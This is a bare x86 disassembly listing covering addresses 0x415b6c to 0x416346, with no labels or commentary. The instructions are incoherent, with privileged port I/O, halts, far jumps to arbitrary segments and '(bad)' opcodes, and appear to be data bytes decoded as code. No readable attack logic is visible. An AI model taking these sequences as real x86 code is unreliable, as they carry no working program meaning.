  415b6c:	scas   al,BYTE PTR es:[edi]
  415b6d:	sub    eax,0xe986aac
  415b72:	arpl   si,dx
  415b74:	pop    edi
  415b75:	mov    edi,gs
  415b77:	sub    eax,0xb5226eb4
  415b7c:	xor    BYTE PTR [ebp-0x34],bl
  415b7f:	push   edx
  415b80:	xor    BYTE PTR [ecx+ecx*2-0x7d03e266],0x18
  415b88:	fwait
  415b89:	mov    esp,0x2bd2b329
  415b8e:	sahf   
  415b8f:	je     0x415b78
  415b91:	xchg   edi,eax
  415b92:	push   0x74
  415b94:	sub    DWORD PTR [ebp-0x4d4c0d56],ecx
  415b9a:	sbb    DWORD PTR [ebp-0x72],edi
  415b9d:	inc    ebp
  415b9e:	mov    cl,0xe6
  415ba0:	sbb    BYTE PTR [edx+0x79],al
  415ba3:	mov    cl,0xa3
  415ba5:	addr16 lock dec esi
  415ba8:	and    ebp,esi
  415baa:	loope  0x415bbe
  415bac:	es push cs
  415bae:	mov    ch,ah
  415bb0:	(bad)  
  415bb2:	sbb    eax,0x7a54906a
  415bb7:	dec    ebp
  415bb8:	cmp    edi,ebx
  415bba:	jbe    0x415b7d
  415bbc:	scas   eax,DWORD PTR es:[edi]
  415bbd:	ror    BYTE PTR ds:0x4aaf7940,cl
  415bc3:	adc    ch,BYTE PTR [eax]
  415bc5:	gs jl  0x415c3a
  415bc8:	adc    DWORD PTR [edx-0x7b],edi
  415bcb:	push   esi
  415bcc:	dec    esi
  415bcd:	add    dl,BYTE PTR [edi+edx*8+0x15]
  415bd1:	and    edi,DWORD PTR [esi+ebx*1+0x0]
  415bd5:	sub    eax,0x521c5cfe
  415bda:	out    dx,al
  415bdb:	not    BYTE PTR [eax-0x51cf24bc]
  415be1:	mov    ecx,0xfcadfeb7
  415be6:	out    dx,al
  415be7:	lods   eax,DWORD PTR ds:[esi]
  415be8:	sbb    BYTE PTR [ecx-0x7edf8544],0x4d
  415bef:	push   esi
  415bf0:	add    edi,DWORD PTR ss:[edi+0x6e]
  415bf4:	into   
  415bf5:	push   ds
  415bf6:	mov    eax,0x90b5543c
  415bfb:	mov    eax,0xbb44f6bb
  415c00:	or     dl,BYTE PTR [eax-0x36]
  415c03:	mov    bh,0x26
  415c05:	xor    ch,BYTE PTR [ecx+0x52]
  415c08:	add    al,cl
  415c0a:	xor    al,0xb8
  415c0c:	shl    DWORD PTR [ecx-0x4acea498],cl
  415c12:	cmp    eax,0x813cad91
  415c17:	cmp    eax,0x1f62591e
  415c1c:	aam    0x20
  415c1e:	das    
  415c1f:	out    0xb1,eax
  415c21:	pop    ss
  415c22:	xchg   esi,eax
  415c23:	adc    al,0xee
  415c25:	ds dec ecx
  415c27:	xchg   esp,eax
  415c28:	adc    DWORD PTR [esi],esp
  415c2a:	cwde   
  415c2b:	xor    DWORD PTR [edi],esi
  415c2d:	hlt    
  415c2e:	mov    bh,BYTE PTR [edi+0x10]
  415c31:	aam    0x60
  415c33:	xor    eax,DWORD PTR [esi+0x72]
  415c36:	xor    eax,0xdef00018
  415c3b:	jp     0x415c37
  415c3d:	cmp    eax,0x439d4ace
  415c42:	pop    ecx
  415c43:	dec    ebp
  415c44:	and    DWORD PTR [esi+0x7c56bcc3],eax
  415c4a:	dec    edi
  415c4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c4c:	lods   eax,DWORD PTR ds:[esi]
  415c4d:	cmp    al,0x91
  415c4f:	jmp    0x7516:0xd98e759a
  415c56:	inc    ebx
  415c57:	xor    DWORD PTR [edx],esi
  415c59:	aad    0x21
  415c5b:	push   ss
  415c5c:	test   al,0xea
  415c5f:	enter  0x506b,0xd8
  415c63:	mov    ds:0x3dfacf9e,al
  415c68:	adc    al,0x3f
  415c6a:	inc    esp
  415c6b:	push   esp
  415c6c:	cli    
  415c6d:	nop
  415c6e:	fimul  WORD PTR [ecx-0x29]
  415c71:	adc    esp,DWORD PTR [eax-0x8]
  415c74:	inc    edi
  415c75:	lods   eax,DWORD PTR ds:[esi]
  415c76:	pop    eax
  415c77:	inc    eax
  415c78:	int    0xb7
  415c7a:	fisttp QWORD PTR [esi+0x47]
  415c7d:	xchg   edi,eax
  415c7e:	hlt    
  415c7f:	cmp    al,0x50
  415c81:	jb     0x415c7c
  415c83:	cmp    eax,0x31235527
  415c88:	fwait
  415c89:	jbe    0x415cfb
  415c8b:	aam    0x10
  415c8d:	dec    DWORD PTR [esi+0x37]
  415c90:	mov    edi,0x89bf6079
  415c95:	rcl    DWORD PTR [eax+ebx*8-0x25],cl
  415c99:	add    BYTE PTR [ecx*2-0x590e0ea8],cl
  415ca0:	jle    0x415ccd
  415ca2:	aam    0x5d
  415ca4:	sar    BYTE PTR [edx],0xd8
  415ca7:	sub    cl,BYTE PTR [eax]
  415ca9:	mov    dl,0x1a
  415cab:	rcr    DWORD PTR [eax-0x27],1
  415cae:	aaa    
  415caf:	mov    al,ds:0x1db5b7a4
  415cb4:	inc    ecx
  415cb5:	or     BYTE PTR [edx+ecx*2],cl
  415cb8:	push   ds
  415cb9:	jg     0x415d37
  415cbb:	adc    ebx,esp
  415cbd:	pop    ss
  415cbe:	add    bh,BYTE PTR [edx+0x4]
  415cc1:	lahf   
  415cc2:	add    BYTE PTR [ecx+ebx*4-0x80],0x5d
  415cc7:	enter  0xc99a,0x21
  415ccb:	ss xor al,0x2b
  415cce:	out    dx,eax
  415ccf:	outs   dx,BYTE PTR ds:[esi]
  415cd0:	ficom  WORD PTR [eax]
  415cd2:	pop    eax
  415cd3:	(bad)  
  415cd4:	mov    dl,0x68
  415cd6:	sub    ebx,DWORD PTR [ebx+0x52]
  415cd9:	lea    esi,[esi+0x48]
  415cdc:	out    0x4f,al
  415cde:	pushf  
  415cdf:	xor    DWORD PTR [edi],ecx
  415ce1:	fidiv  DWORD PTR [edx+0x7a5861ae]
  415ce7:	in     al,0xe2
  415ce9:	mov    ecx,ds
  415ceb:	sub    eax,0x2b380332
  415cf1:	cmp    esp,DWORD PTR [eax-0x3f]
  415cf4:	cld    
  415cf5:	hlt    
  415cf6:	inc    ebx
  415cf7:	mov    bh,0x28
  415cf9:	call   0x806a8f1
  415cfe:	rcr    DWORD PTR ds:0x6e917533,1
  415d04:	sti    
  415d05:	mov    esp,ebp
  415d07:	ret    0x401b
  415d0a:	je     0x415ccc
  415d0c:	xchg   edi,eax
  415d0d:	loope  0x415d1c
  415d0f:	fstp   st(1)
  415d11:	cli    
  415d12:	mov    dh,0x76
  415d14:	dec    edi
  415d15:	in     eax,0x1d
  415d17:	fbstp  TBYTE PTR [esi]
  415d19:	not    dh
  415d1b:	iret   
  415d1c:	xchg   ecx,eax
  415d1d:	dec    eax
  415d1e:	sbb    BYTE PTR [bp+si+0x5e7b],dh
  415d23:	mov    eax,ds:0xbabb1f6b
  415d28:	mov    eax,0x570a6733
  415d2d:	pop    es
  415d2e:	mov    eax,ds:0xa675352e
  415d33:	xor    BYTE PTR [ebx],ah
  415d35:	call   0xa2e118e9
  415d3a:	adc    al,0x61
  415d3c:	pop    ebx
  415d3d:	or     eax,esp
  415d3f:	and    eax,0xd4c012aa
  415d44:	scas   eax,DWORD PTR es:[edi]
  415d45:	dec    edx
  415d46:	and    eax,0x363b9b96
  415d4b:	(bad)  
  415d4c:	adc    dl,BYTE PTR [eax+0x13c3cd9e]
  415d52:	ss adc al,0x11
  415d55:	pushf  
  415d56:	or     cl,cl
  415d58:	dec    ecx
  415d59:	cld    
  415d5a:	mov    bl,0x74
  415d5c:	add    dl,BYTE PTR [ebp+0x71c1e2ae]
  415d62:	data16 fadd DWORD PTR [ecx]
  415d65:	cmp    BYTE PTR [ebx-0x10],0x84
  415d69:	ss inc ecx
  415d6b:	adc    eax,0xd7663405
  415d70:	out    dx,al
  415d71:	dec    edi
  415d72:	cwde   
  415d73:	call   0xb5f4:0xc364e584
  415d7a:	push   es
  415d7b:	inc    ebx
  415d7c:	enter  0x789b,0xc1
  415d80:	cld    
  415d81:	(bad)
  415d85:	jnp    0x415dca
  415d87:	stos   DWORD PTR es:[edi],eax
  415d88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d89:	inc    edx
  415d8a:	aas    
  415d8b:	test   DWORD PTR [edi+0x6ce5fb5],ecx
  415d91:	sub    BYTE PTR [edi+0x19],cl
  415d94:	aad    0x3
  415d96:	sbb    DWORD PTR [ecx+0x69],esp
  415d99:	int3   
  415d9a:	fs scas al,BYTE PTR es:[edi]
  415d9c:	cmp    edx,DWORD PTR [ebx+ebx*4+0x4aed0711]
  415da3:	jg     0x415d3f
  415da5:	xor    al,0x86
  415da7:	scas   al,BYTE PTR es:[edi]
  415da8:	imul   edx,esi,0xfffffffa
  415dab:	or     esi,DWORD PTR [edx]
  415dad:	cs xchg ecx,eax
  415daf:	retf   
  415db0:	test   BYTE PTR [ebp-0x51],0x5c
  415db4:	mov    ebp,0x5a8f1232
  415db9:	test   eax,0x1c27eaab
  415dbe:	div    BYTE PTR [edx-0x4d]
  415dc1:	mov    DWORD PTR [edx],ecx
  415dc3:	(bad)  
  415dc4:	pop    ebp
  415dc5:	cli    
  415dc6:	cmp    ebp,DWORD PTR [eax+0x58923960]
  415dcc:	sti    
  415dcd:	fadd   st,st(6)
  415dd0:	cmc    
  415dd1:	inc    esp
  415dd2:	pop    edx
  415dd3:	lods   eax,DWORD PTR ds:[esi]
  415dd4:	xchg   esi,eax
  415dd5:	cs fcomi st,st(7)
  415dd8:	sbb    al,0x5b
  415dda:	fs repnz mov ah,bl
  415dde:	cdq    
  415ddf:	inc    edx
  415de0:	daa    
  415de1:	enter  0x9efe,0xb
  415de5:	les    ebx,FWORD PTR [esi-0x7b8da4a0]
  415deb:	mov    esp,0xc20c98f3
  415df0:	arpl   si,si
  415df2:	and    al,0x10
  415df4:	retf   
  415df5:	cmp    DWORD PTR [esi-0x77],edx
  415df8:	sbb    ebp,DWORD PTR [ebp-0xe]
  415dfb:	cmp    esp,edi
  415dfd:	and    al,0x95
  415dff:	out    dx,al
  415e00:	lods   al,BYTE PTR ds:[esi]
  415e01:	pushf  
  415e02:	loopne 0x415d99
  415e04:	(bad)  
  415e05:	stc    
  415e06:	add    eax,0xa8523aa4
  415e0b:	push   edi
  415e0c:	sub    cl,ah
  415e0e:	retf   
  415e0f:	cmp    ebx,edx
  415e11:	popf   
  415e12:	inc    esp
  415e13:	and    al,0x3f
  415e15:	fcomp  DWORD PTR [edi+0x577917e4]
  415e1b:	retf   
  415e1c:	pcmpgtb mm4,QWORD PTR [ecx+ebx*2-0x2a]
  415e21:	call   0x14a2:0x33745976
  415e28:	int    0x7a
  415e2a:	or     cl,BYTE PTR [ebp-0x69e6ea1a]
  415e30:	mov    edi,0x315402bf
  415e35:	sub    ah,BYTE PTR [eax]
  415e37:	sti    
  415e38:	jg     0x415e1d
  415e3a:	dec    ebx
  415e3b:	sahf   
  415e3c:	sahf   
  415e3d:	hlt    
  415e3e:	cli    
  415e3f:	call   0xd2c4a597
  415e44:	jmp    0x415e5c
  415e46:	cmp    DWORD PTR [ebx+0x1f],ecx
  415e49:	mov    ch,0xdf
  415e4b:	mov    eax,DWORD PTR [ebx-0x51ab3cf5]
  415e51:	(bad)  
  415e52:	jb     0x415e2e
  415e54:	out    dx,al
  415e55:	sbb    eax,0xbeee5e09
  415e5a:	or     al,0x62
  415e5c:	in     al,0x52
  415e5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e5f:	fistp  DWORD PTR [ecx]
  415e61:	gs cwde 
  415e63:	ds hlt 
  415e65:	cli    
  415e66:	rcr    DWORD PTR ds:0x917c1817,1
  415e6c:	pop    ecx
  415e6d:	scas   eax,DWORD PTR es:[edi]
  415e6e:	leave  
  415e6f:	lahf   
  415e70:	ss inc esi
  415e72:	lods   al,BYTE PTR ds:[esi]
  415e73:	fcmovnu st,st(7)
  415e75:	add    bl,BYTE PTR [edi]
  415e77:	or     eax,0x3fb16d73
  415e7c:	dec    esp
  415e7d:	xchg   DWORD PTR [edx+eiz*4-0x47b65c69],esi
  415e84:	das    
  415e85:	adc    BYTE PTR [eax],0x18
  415e88:	imul   ebx,DWORD PTR ds:0xd34141e6,0xe15abb5e
  415e92:	adc    DWORD PTR [ecx+esi*1+0x16fd6730],esi
  415e99:	ja     0x415e89
  415e9b:	adc    ah,0x80
  415e9e:	cmp    BYTE PTR [ebx+0x34],cl
  415ea1:	jns    0x415e30
  415ea3:	rcl    DWORD PTR [ecx+0x52164d75],cl
  415ea9:	cmp    al,0xcd
  415eab:	ficomp DWORD PTR [edi-0x4f85cc47]
  415eb1:	and    ebp,DWORD PTR [ebx+0x249a3e8a]
  415eb7:	push   ecx
  415eb8:	mov    BYTE PTR [ebx-0x9],0xe7
  415ebc:	jmp    0xf89d2e04
  415ec1:	int3   
  415ec2:	adc    cl,bl
  415ec4:	les    ecx,FWORD PTR [ecx-0x3b]
  415ec7:	cmp    al,0x3e
  415ec9:	fpatan 
  415ecb:	and    al,0xbb
  415ecd:	in     eax,dx
  415ece:	or     BYTE PTR [eax+0x642b72be],al
  415ed4:	jns    0x415f20
  415ed6:	es sbb eax,0x7b584c49
  415edc:	ret    0xb06f
  415edf:	add    ah,ah
  415ee1:	pop    ds
  415ee2:	aad    0xb8
  415ee4:	xchg   edx,eax
  415ee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ee6:	call   0x96eb4817
  415eeb:	daa    
  415eec:	ds dec ebp
  415eee:	call   0x206:0xc088d375
  415ef5:	outs   dx,BYTE PTR ds:[esi]
  415ef6:	mov    db1,ecx
  415ef9:	sub    eax,0x8e17c410
  415efe:	js     0x415f0f
  415f00:	inc    ebx
  415f01:	sub    DWORD PTR [eax+0x73],esp
  415f04:	scas   eax,DWORD PTR es:[edi]
  415f05:	popf   
  415f06:	adc    al,0xb0
  415f08:	adc    al,0x28
  415f0a:	sbb    ecx,DWORD PTR [edi-0x2ac75f25]
  415f10:	mov    DWORD PTR [esi-0x7a8be50f],edx
  415f16:	sub    esp,DWORD PTR [eax-0x57]
  415f19:	xchg   bh,ah
  415f1b:	inc    ebp
  415f1c:	sub    eax,0x99f3b826
  415f21:	div    BYTE PTR [esi]
  415f23:	les    edx,FWORD PTR [esi-0x67]
  415f26:	cmp    edi,DWORD PTR [ecx+0x5c213060]
  415f2c:	adc    ebp,DWORD PTR [eax-0x2a4d829d]
  415f32:	int3   
  415f33:	xchg   ecx,eax
  415f34:	cmp    BYTE PTR [ecx],dh
  415f36:	lahf   
  415f37:	pop    ds
  415f38:	xor    dh,ah
  415f3a:	xor    ebp,DWORD PTR [ecx-0x42]
  415f3d:	shl    DWORD PTR [ecx-0x7ae7f5ee],0x84
  415f44:	jb     0x415faa
  415f46:	sbb    eax,0x28d1abbc
  415f4b:	inc    edx
  415f4c:	enter  0x9416,0x11
  415f50:	rol    dh,0x31
  415f53:	stc    
  415f54:	icebp  
  415f55:	addr16 jns 0x415f2b
  415f58:	in     eax,0x46
  415f5a:	mov    ecx,0xa2adc907
  415f5f:	fcom   QWORD PTR [ebx]
  415f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f62:	jae    0x415f23
  415f64:	psubsb mm1,mm0
  415f67:	pop    ecx
  415f68:	cmp    eax,eax
  415f6a:	or     al,0x52
  415f6c:	jge    0x415f1b
  415f6e:	mov    ebp,0x3e4026f7
  415f73:	aas    
  415f74:	mov    ds:0xf720509d,al
  415f79:	jnp    0x415fe1
  415f7b:	mov    al,ds:0x8bca3cbd
  415f80:	stos   DWORD PTR es:[edi],eax
  415f81:	loopne 0x415fbe
  415f83:	adc    eax,0x7b028b7a
  415f88:	pop    si
  415f8a:	or     al,0x60
  415f8c:	cmp    ebp,DWORD PTR [edx]
  415f8e:	inc    eax
  415f8f:	shl    DWORD PTR [edx],cl
  415f91:	xchg   esi,eax
  415f92:	imul   eax,eax,0x1e2e66b5
  415f98:	int    0xc2
  415f9a:	scas   al,BYTE PTR es:[edi]
  415f9b:	xchg   esp,eax
  415f9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f9d:	adc    ah,BYTE PTR ss:[eax-0x65c4d305]
  415fa4:	inc    edi
  415fa5:	packssdw mm0,QWORD PTR [esp+ecx*4]
  415fa9:	sar    DWORD PTR [ecx-0x62966bcd],cl
  415faf:	ror    DWORD PTR [ebx],0xe0
  415fb2:	ds pop edx
  415fb4:	repnz xchg ecx,eax
  415fb6:	add    bh,BYTE PTR [eax+0x28]
  415fb9:	mov    edx,0xdc5cf1f2
  415fbe:	jb     0x416028
  415fc0:	addr16 xchg ebx,eax
  415fc2:	(bad)  
  415fc3:	aad    0xe6
  415fc5:	mov    dh,BYTE PTR [ecx+ecx*1]
  415fc8:	fild   QWORD PTR ds:0xbe841f24
  415fce:	neg    BYTE PTR ds:[eax]
  415fd1:	cmp    BYTE PTR [edi+ebx*8-0x6d6419fd],cl
  415fd8:	shl    BYTE PTR [esi+esi*1-0x7d910ced],cl
  415fdf:	ret    
  415fe0:	jecxz  0x415f66
  415fe2:	add    esi,ebp
  415fe4:	dec    edi
  415fe5:	(bad)  
  415fe6:	and    esi,DWORD PTR [eax+0x2d]
  415fe9:	cs xchg esi,eax
  415feb:	ja     0x415ff2
  415fed:	sub    DWORD PTR [ebx+0x55],edx
  415ff0:	dec    esi
  415ff1:	fistp  DWORD PTR [ebp-0x24f351c0]
  415ff7:	test   eax,0x68af0916
  415ffc:	mov    ds:0xe9036915,al
  416001:	mov    al,ds:0xffb1442a
  416006:	inc    edi
  416007:	or     ax,0x74e4
  41600b:	cmp    al,0x8c
  41600d:	inc    ebp
  41600e:	xchg   ebx,eax
  41600f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416010:	mov    cl,BYTE PTR [ecx+0x281d857]
  416016:	std    
  416017:	dec    eax
  416018:	jg     0x416000
  41601a:	inc    ebx
  41601b:	iret   
  41601c:	xchg   ecx,eax
  41601d:	lds    esp,FWORD PTR [esi+0x59dce981]
  416023:	jle    0x41606c
  416025:	mov    ebp,0xad926d14
  41602a:	cmp    BYTE PTR [edi+0x219b3ffe],0x5d
  416031:	and    DWORD PTR [esi+eax*8+0x34],esp
  416035:	enter  0x2609,0xc0
  416039:	push   edi
  41603a:	call   0x2a0e:0x5b5a5112
  416041:	out    0x15,al
  416043:	add    DWORD PTR [ecx-0x4b],esi
  416046:	push   ebp
  416047:	push   edi
  416048:	ret    
  416049:	int    0xe
  41604b:	jmp    0x53a7fbb9
  416050:	mov    esi,DWORD PTR [ebp-0x5008a621]
  416056:	(bad)  
  416058:	in     eax,0xcd
  41605a:	repz jle 0x416031
  41605d:	je     0x4160ae
  41605f:	push   es
  416060:	mov    edx,0x5c8888ae
  416065:	daa    
  416066:	jge    0x415ff3
  416068:	lods   eax,DWORD PTR ds:[esi]
  416069:	mov    dh,0x9b
  41606b:	ret    0xb2d2
  41606e:	push   ebx
  41606f:	cli    
  416070:	inc    edi
  416071:	mov    dl,0xc6
  416073:	sbb    ebx,DWORD PTR [edx]
  416075:	or     DWORD PTR [edi+0x6fbde7eb],ebp
  41607b:	sar    DWORD PTR [ecx-0x492e6e0c],cl
  416081:	fisttp WORD PTR [ecx-0x41]
  416084:	in     eax,dx
  416085:	inc    DWORD PTR [ebx-0x36]
  416088:	sub    esi,DWORD PTR cs:[eax+0xc1b0fef]
  41608f:	int3   
  416090:	icebp  
  416091:	xchg   ebx,eax
  416092:	jecxz  0x41601e
  416094:	arpl   WORD PTR [edx+eiz*8+0x4],si
  416098:	push   ebp
  416099:	ret    0x5e12
  41609c:	mov    bp,0x75e8
  4160a0:	dec    ebx
  4160a1:	pushf  
  4160a2:	out    0xa2,al
  4160a4:	(bad)  
  4160a5:	test   eax,0x1799d0c1
  4160aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160ab:	sbb    eax,0xcc1cccb3
  4160b0:	xlat   BYTE PTR ds:[ebx]
  4160b1:	mov    esi,0xa4bf03b3
  4160b6:	jbe    0x4160cb
  4160b8:	in     al,dx
  4160b9:	push   edx
  4160ba:	pop    edx
  4160bb:	mov    ecx,0x7769f8ba
  4160c0:	sbb    al,0x98
  4160c2:	jecxz  0x416060
  4160c4:	into   
  4160c5:	js     0x4160ea
  4160c7:	add    BYTE PTR [ecx+0x42b00e6c],0xd9
  4160ce:	push   ecx
  4160cf:	pop    ax
  4160d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160d2:	retf   0x8255
  4160d5:	mov    ah,0x1d
  4160d7:	push   ecx
  4160d8:	or     al,0xf8
  4160da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160db:	arpl   WORD PTR [ecx-0x29d26dd],bp
  4160e1:	aam    0x54
  4160e3:	ror    DWORD PTR [ecx-0x1b],0xb5
  4160e7:	adc    BYTE PTR [ebx-0x5a],al
  4160ea:	jmp    0x4160b7
  4160ec:	test   DWORD PTR [edx+0x64833405],esp
  4160f2:	ins    BYTE PTR es:[edi],dx
  4160f3:	(bad)  
  4160f4:	jno    0x416141
  4160f6:	jg     0x4160f8
  4160f8:	rcl    DWORD PTR [esi],1
  4160fa:	daa    
  4160fb:	repz idiv DWORD PTR [ebx+0x3f7a4]
  416102:	out    0x33,al
  416104:	xlat   BYTE PTR ds:[ebx]
  416105:	and    cl,ah
  416107:	icebp  
  416108:	(bad)  
  416109:	out    0xc2,eax
  41610b:	loop   0x416101
  41610d:	fbld   TBYTE PTR [esi]
  41610f:	mov    ch,0x51
  416111:	retf   0x5b38
  416114:	outs   dx,BYTE PTR ds:[esi]
  416115:	je     0x4160a7
  416117:	sar    dl,0x56
  41611a:	jmp    0x416139
  41611c:	scas   al,BYTE PTR es:[edi]
  41611d:	aas    
  41611e:	jnp    0xf94f4707
  416124:	xor    eax,0x527c5fe
  416129:	xchg   ebp,eax
  41612a:	(bad)  
  41612b:	imul   ecx,ecx,0xe2d3d290
  416131:	or     eax,esi
  416133:	sahf   
  416134:	aas    
  416135:	xor    bl,BYTE PTR [esi-0x477f3a5b]
  41613b:	or     esi,DWORD PTR [ebp-0x7eead0b9]
  416141:	push   edi
  416142:	and    BYTE PTR [edi+0x3bcf9185],al
  416148:	hlt    
  416149:	imul   esi,eax,0xa
  41614c:	pop    eax
  41614d:	dec    esp
  41614e:	setae  BYTE PTR [ebx+0x379b0d0a]
  416155:	adc    al,0xf2
  416157:	loop   0x41610f
  416159:	out    0xa2,eax
  41615b:	in     eax,0x96
  41615d:	ret    
  41615e:	ss scas eax,DWORD PTR es:[edi]
  416160:	push   cs
  416161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416162:	jg     0x4161cd
  416164:	div    DWORD PTR [ebp-0x56195bd8]
  41616a:	out    0xeb,al
  41616c:	int    0xac
  41616e:	push   ebp
  41616f:	shr    DWORD PTR [esi+edi*2-0x75],0xe8
  416174:	pop    ds
  416175:	and    eax,eax
  416177:	fstp   DWORD PTR [edx+0x54]
  41617a:	adc    BYTE PTR [ebp-0x66],ah
  41617d:	jp     0x4161ca
  41617f:	xor    al,0x53
  416181:	pop    ebp
  416182:	or     edx,DWORD PTR [ebp-0x3246279a]
  416188:	dec    ebp
  416189:	xchg   esi,eax
  41618a:	xor    BYTE PTR [edi-0x20d76a73],bh
  416190:	aam    0xe0
  416192:	sbb    ah,cl
  416194:	test   BYTE PTR [esi],dl
  416196:	or     ch,BYTE PTR ds:0xcf592a6e
  41619c:	loop   0x416157
  41619e:	inc    eax
  41619f:	int3   
  4161a0:	cmp    DWORD PTR [esi],0xab6316c5
  4161a6:	adc    eax,0xd0bd21b0
  4161ab:	sub    DWORD PTR fs:[ecx+edi*8+0x6af78dcd],ebp
  4161b3:	xchg   esi,eax
  4161b4:	xchg   edx,eax
  4161b5:	leave  
  4161b6:	imul   ecx,DWORD PTR [esi+0x4f],0xffffff94
  4161ba:	gs stc 
  4161bc:	int    0x66
  4161be:	es dec ecx
  4161c0:	jle    0x416213
  4161c2:	mov    edx,0x2c2e5a5c
  4161c7:	adc    cl,cl
  4161c9:	pop    ebx
  4161ca:	pop    edi
  4161cb:	add    edi,DWORD PTR [ebp+0x7]
  4161ce:	xlat   BYTE PTR ds:[ebx]
  4161cf:	nop
  4161d0:	push   ecx
  4161d1:	mov    al,ds:0xdd5a01ba
  4161d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161d7:	stos   BYTE PTR es:[edi],al
  4161d8:	iret   
  4161d9:	cld    
  4161da:	cwde   
  4161db:	int3   
  4161dc:	jb     0x416251
  4161de:	out    dx,al
  4161df:	add    cl,BYTE PTR [esi+0x2a]
  4161e2:	xor    esi,DWORD PTR [esi]
  4161e4:	xor    al,0xb5
  4161e6:	jnp    0x416258
  4161e8:	push   edi
  4161e9:	cmp    DWORD PTR [ebp-0x27],0xffffffec
  4161ed:	mov    dl,0x94
  4161ef:	mov    ebp,0xab6f78d7
  4161f4:	inc    ebp
  4161f5:	aas    
  4161f6:	or     BYTE PTR [ebp+edi*1+0x2e02faca],bh
  4161fd:	outs   dx,DWORD PTR ds:[esi]
  4161fe:	sub    DWORD PTR [ebp+0x73],ebx
  416201:	pusha  
  416202:	arpl   bp,cx
  416204:	mov    bh,0x61
  416206:	mov    ds:0xf0d1d9d2,eax
  41620b:	cmp    DWORD PTR [ebp+0x8585c06],0x60f2dc2c
  416215:	cmp    al,BYTE PTR [eax+ebp*8+0x64008ab9]
  41621c:	(bad)  
  41621d:	jge    0x4161ed
  41621f:	icebp  
  416220:	arpl   ax,si
  416222:	xor    al,cl
  416224:	jle    0x4161c2
  416226:	xlat   BYTE PTR ds:[ebx]
  416227:	adc    al,0xba
  416229:	sub    BYTE PTR [edx+0xdedaa83],ah
  41622f:	js     0x4161d4
  416231:	setb   BYTE PTR [ebx]
  416234:	pop    eax
  416235:	or     dl,0x7c
  416238:	sbb    al,0x19
  41623a:	inc    eax
  41623b:	sbb    al,0x6e
  41623d:	jmp    0x902dbf14
  416242:	cmp    DWORD PTR [edx],edx
  416244:	xchg   edi,eax
  416245:	adc    al,al
  416247:	js     0x41626e
  416249:	xchg   esp,eax
  41624a:	mov    eax,0x640f4e6a
  41624f:	and    BYTE PTR [ecx-0x39],cl
  416252:	push   0xbf599188
  416257:	enter  0xe423,0x98
  41625b:	stos   DWORD PTR es:[edi],eax
  41625c:	or     eax,0xb313376d
  416261:	jmp    0xed6a:0x6e7b7e5d
  416268:	dec    edi
  416269:	adc    eax,0x9241c7dd
  41626e:	mov    ebp,0xcf0c8ac1
  416273:	mov    ecx,DWORD PTR [edx]
  416275:	and    al,bh
  416277:	sbb    ecx,ecx
  416279:	loopne 0x416289
  41627b:	xchg   edi,eax
  41627c:	dec    ebp
  41627d:	fimul  DWORD PTR [eax-0x62]
  416280:	xor    dh,BYTE PTR [ebx-0x5c]
  416283:	inc    esp
  416284:	and    BYTE PTR ds:0x1a243670,0x81
  41628b:	inc    esp
  41628c:	in     al,0x3b
  41628e:	cmp    ebx,DWORD PTR [eax+0x48]
  416291:	lods   al,BYTE PTR ds:[esi]
  416292:	mov    esi,0xda50e886
  416297:	mov    ds:0x29f8af96,eax
  41629c:	lock push edi
  41629e:	in     eax,dx
  41629f:	jg     0x41623c
  4162a1:	rcr    DWORD PTR [edi-0x53c0e2fb],1
  4162a7:	sbb    DWORD PTR [ecx],ebp
  4162a9:	inc    esp
  4162aa:	call   0x39151e3d
  4162af:	sub    edx,ebx
  4162b1:	adc    al,0x9c
  4162b3:	sub    ah,BYTE PTR [eax+eiz*8]
  4162b6:	cmp    eax,0xa9b9852e
  4162bb:	(bad)  
  4162bc:	es push 0xffffffa1
  4162bf:	outs   dx,DWORD PTR ds:[esi]
  4162c0:	repz sbb dh,BYTE PTR [edi+edi*2-0x6742f799]
  4162c8:	pop    ecx
  4162c9:	test   al,0x57
  4162cb:	mov    ah,0x17
  4162cd:	adc    DWORD PTR [esi+0x785de690],eax
  4162d3:	lods   al,BYTE PTR ds:[esi]
  4162d4:	xchg   edi,eax
  4162d5:	cmp    dl,bh
  4162d7:	and    dh,cl
  4162d9:	and    al,0xdf
  4162db:	mov    ebp,0x78cf401f
  4162e0:	loope  0x416325
  4162e2:	leave  
  4162e3:	test   al,0x32
  4162e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162e6:	and    ah,BYTE PTR [edx-0x64]
  4162e9:	call   0x9316:0x74c98316
  4162f0:	pusha  
  4162f1:	pop    es
  4162f2:	aam    0x63
  4162f4:	adc    dh,BYTE PTR [edx+0x3013c1dc]
  4162fa:	cs sahf 
  4162fc:	data16 das 
  4162fe:	in     eax,dx
  4162ff:	imul   eax
  416301:	loop   0x416335
  416303:	sar    ecx,cl
  416305:	xchg   ebp,eax
  416306:	imul   BYTE PTR [eax+0x53c474ff]
  41630c:	arpl   WORD PTR [edx],dx
  41630e:	pop    esi
  41630f:	pop    edi
  416310:	xchg   esi,eax
  416311:	leave  
  416312:	(bad)  
  416314:	pop    es
  416315:	push   ebx
  416316:	cld    
  416317:	jg     0x4162fe
  416319:	or     BYTE PTR [edi+esi*8],dh
  41631c:	adc    eax,0x6bf47f3c
  416321:	ficomp DWORD PTR [esi]
  416323:	retf   0x48e4
  416326:	and    bl,bl
  416328:	sbb    dh,BYTE PTR ds:0x87b42f15
  41632e:	adc    ah,BYTE PTR [edi+edx*2+0x66aa3d7b]
  416335:	push   0x351c55df
  41633a:	ret    0x71e4
  41633d:	mov    ebx,DWORD PTR [edx]
  41633f:	out    0x5e,eax
  416341:	scas   eax,DWORD PTR es:[edi]
  416342:	sbb    BYTE PTR [ebx],dl
  416344:	into   
  416345:	ret    
  416346:	fisub  DWORD PTR [ebx+0x3e]
